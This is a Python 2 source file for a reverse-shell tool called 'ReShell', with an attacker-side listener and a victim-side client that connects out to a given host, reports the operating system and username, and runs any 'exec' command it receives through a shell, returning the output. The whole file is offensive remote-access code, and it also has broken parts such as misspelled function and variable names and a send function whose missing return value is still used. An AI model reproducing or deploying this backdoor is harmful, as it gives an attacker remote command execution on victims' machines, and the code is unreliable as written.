#!/usr/bin/env python
# -*- coding: UTF-8 -*-
# coded by Deen

import socket, subprocess as sp, sys, os


def color_print(color, text):
    color_end = '\033[0m'

    if color.lower() == "r" or color.lower() == "red":
        red = '\033[91m'
        text = red + text + color_end

    elif color.lower() == "lgray":
        gray = '\033[2m'
        text = gray + text + color_end

    elif color.lower() == "strike":
        strike = '\033[9m'
        text = strike + text + color_end

    elif color.lower() == "underline":
        underline = '0\33[4m'
        text = underline + text + color_end
    elif color.lower() == "b" or color.lower() == "blue":
        blue = '\033[94m'
        text = blue + text + color_end

    elif color.lower() == "g" or color.lower() == "green":
        green = '\033[92m'
        text = green + text + color_end

    elif color.lower() == "y" or color.lower() == "yellow":
        yellow = "\033[93m"
        text = yellow + text + color_end

    else:
        return text

    return text


def banner():
    banner = '''
    ######################################################################
    #                                                                   #
    #    ██████╗ ███████╗███████╗██╗  ██╗███████╗██╗     ██╗            #
    #    ██╔══██╗██╔════╝██╔════╝██║  ██║██╔════╝██║     ██║            #
    #    ██████╔╝█████╗  ███████╗███████║█████╗  ██║     ██║            #
    #    ██╔══██╗██╔══╝  ╚════██║██╔══██║██╔══╝  ██║     ██║            #
    #    ██║  ██║███████╗███████║██║  ██║███████╗███████╗███████╗       #
    #    ╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝       #
    #                                                                   #
    ######################################################################
'''

    return color_print('b', banner)

def main_control():
    try :
        host = sys.argv[1] # Attacker's host address, usually ''
        port = int(sys.argv[2]) # Attacker host port
    except Exception as o:
        print color_print("red", "[-]") + "Socket Infomation Not Provided"
        sys.exit(1)

    print color_print("g", " [+]") + color_print("b", " Framework Started Successfully")
    print banner()

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # setup socket

    s.bind((host, port))
    s.listen(5)
    if host == "":
        host = "localhost"
    print color_print("g", " [Info ] *") + color_print("b", "Listening on %s:%d ..." % (host, port))

    try:
        conn, addr = s.accept()
    except KeyboardInterrupt:
        print "\n\n " + color_print("red", "[-]") + color_print("b", " User Requested An Interrupt")
        sys.exit(0)

    console(conn, str(addr[0]))

    s.close()

def consele(connection, address):
    print color_print("g", " [ Info ]") + color_print("b", "Connection Established from: %s\n" %(address))

    sysinfo = connection.recv(2048).split(",")

    x_info = ""
    x_info += color_print("g", " Operating System: ") + "%s\n"% (color_print('b', sysinfo[0]))
    x_info += color_print("g", " Computer Name: ") + '%s\n'% (color_print('b',sysinfo[1]))
    x_info += color_print("g", " Useranme: ") + "%s\n" % (color_print('b',sysinfo[5]))
    x_info += color_print("g", " Release Version: ") + '%s\n' % (color_print('b', sysinfo[2]))
    x_info += color_print("g", " System Version: ") + '%s\n' %(color_print('b', sysinfo[3]))
    x_info += color_print("g", " Machine Architecture: ") + '%s\n' %(color_print('b', sysinfo[4]))

    user = sysinfo[5] + "@" + address

    while 1:
        command = raw_input(" " + color_print("underline", color_print("lgray", "%s" % (user))) + " " +color_print("lgray", ">").strip())

        if command.split(" ")[0] == "exec":
            if len(command.split(" ")) == 1:
                print color_print("r", "\n [!] ") + color_print("b", "Command: exec <command>")
                print color_print("g", " Execute Argument As Command On Remote Host\n")
                continue

            res = 1
            msg = ""

            while len(command.split(" ")) > res:
                msg += command.split(" ")[res] + " "
                res += 1

            response = send_data(connetion, "exec " + msg)

            if response.split("\n")[-1].strip() != "":
                response += "\n"

            if response.split("\n")[0].strip() != "":
                response = "\n" + response

            for x in response.split("\n"):
                print " " + x


        elif command == "":
            continue
        elif command == "cls":
            dp = os.system("clear")
        elif command == "help":
            print color_print("lgray", help())
        elif command == "sysinfo":
            print "\n" + color_print("gray", x_info) + "\n"
        elif command == "exit()":
            connection.send("exit()") # send client_shutdown message
            print color_print("b", "[+] ") + color_print("g", "Shell Going Down")
            break
        else:
            print color_print("red", " [!] Unkown Command")


def help():

    help_list = {}
    help_list["sysinfo"] = "Display Remote System Information"
    help_list["exec"] = "Execute Argument As Command On Remeto Host"
    help_list["exit()"] = "Exit And Send Halt Command To Remote Host"
    help_list["cls"] = "Clears The Terminal"
    help_list["help"] = "Prints this help message"

    return_str = color_print("g", "\n Command ") + " . "
    return_str += color_print("b", " Description\n %s\n" %(color_print("gray", "-"*50)))

    for x in sorted(help_list):
        dec = help_list[x]
        return_str += " " +color_print("g", x) + " - " + color_print("b", dec + "\n")

    return return_str.rstrip("\n")



def send_data(conn, data):
    length = str(len(data)).zfill(16)
    conn.send(length + data)

def connect():
    try:
        host = sys.argv[1]
        port = int(sys.argv[2])

    except Exception as e:
        sys.exit(1)

    conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    conn.connect((host, port))

    x_info = ""

    for x in os.uname():
        x_info += x + ","

    x_info += os.getlogin()

    conn.send(x_info)
    interactive_session(conn)
    conn.close()

def interactive_session(conn):
    while 1:
        try :
            command = str(conn.recv(1024))
        except socket.error:
            sys.exit(1)

        if command.split(" ")[0] == "exec":
            res = 1
            msg = ""

            while len(command.split(" ")) > res:
                msg += command.split(" ")[res] + " "
                res += 1

            sh = sp.Popen(msg, shell=True,
                stdout = sp.PIPE,
                stderr = sp.PIPE,
                stdin = sp.PIPE)

            out, err = sh.communicate()

            result = str(out) + str(err)

            send_data(conn, result)
        elif command == "exit()":
            break
        else:
            send_data(conn, "[-] Unknown Command")


if __name__ == '__main__':
    connect()
